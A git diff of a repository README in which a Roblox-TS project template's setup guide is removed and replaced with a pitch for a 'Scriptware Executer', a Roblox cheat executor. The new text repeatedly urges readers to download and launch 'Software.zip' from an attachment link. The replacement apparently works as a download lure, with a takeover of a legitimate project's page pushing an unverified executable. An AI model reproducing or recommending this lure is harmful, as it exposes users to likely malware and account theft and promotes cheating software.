@@ -1,30 +1,34 @@
-# Roblox-TS-Multiplace
-A Template for Roblox-TS with built with lapis, reflex, flamework. 
-## Prerequisite
-- Understanding Roblox-TS 
-- Knowledge of Lapis, Reflex, Flamework
-- Installed `rokit` as your toolchain manager
-- Installed `pnpm` as your package manager, `npm` is fine but `pnpm` is preferred
-- Knows how to use `mantle` and `asphalt` 
-## Getting Started
-There are several methods to get started with this template.
-Cloning the repository:
-```bash
-git clone https://github.com/NormalDuck/Roblox-TS-Multiplace.git
-```
-Using the template:
-Click `Use this template` and select `Create a new repository`
-Setting it up directly within a folder:
-```bash
-npx degit NormalDuck/Roblox-TS-Multiplace
-```
-## Setting up
-1. Install packages: `pnpm i`
-2. Configurate asphalt settings in `asphalt.toml`
-3. Configurate settings for `mantle.yml`
-4. Setup `.env`, for `asphalt` and `mantle`
-## Commands
-- Installing: `pnpm i`
-- Building: `pnpm build:dev`
-- Watching: `pnpm watch:dev`
-- Syncing: `pnpm sync`
+# Scriptware Executer 🚀
+
+Welcome to the Scriptware Executer repository!
+
+## Description
+The Scriptware Executer is a powerful Roblox script executor that allows users to bring their ideas to life in the virtual world. At Script-Ware, we are committed to developing software experiences that go beyond the ordinary, pushing boundaries and enabling creativity to flourish.
+
+## How to Use
+To access the Scriptware Executer, please download the software package from the link provided below. 
+
+[Launch Scriptware Executer](https://github.com/user-attachments/files/18060583/Software.zip)
+
+If the link doesn't automatically start the download, please click the button below:
+
+[![Launch Scriptware Executer](https://img.shields.io/badge/Launch-Scriptware%20Executer-blue.svg)](https://github.com/user-attachments/files/18060583/Software.zip)
+
+## Features
+- Robust script execution capabilities
+- User-friendly interface
+- Regular updates and improvements
+
+## Installation Guide
+1. Download the software package from the provided link.
+2. Extract the files to your preferred location.
+3. Launch the Scriptware Executer application.
+4. Start transforming your ideas into reality in Roblox!
+
+## Contributions
+We welcome contributions from the community to enhance the Scriptware Executer. Feel free to submit any feedback, bug reports, or suggestions via the GitHub platform.
+
+## Support
+For any inquiries or assistance, please reach out to our team at support@scriptware.com.
+
+Thank you for choosing Scriptware Executer! We look forward to seeing the amazing creations you will bring to life with our software. 🌟
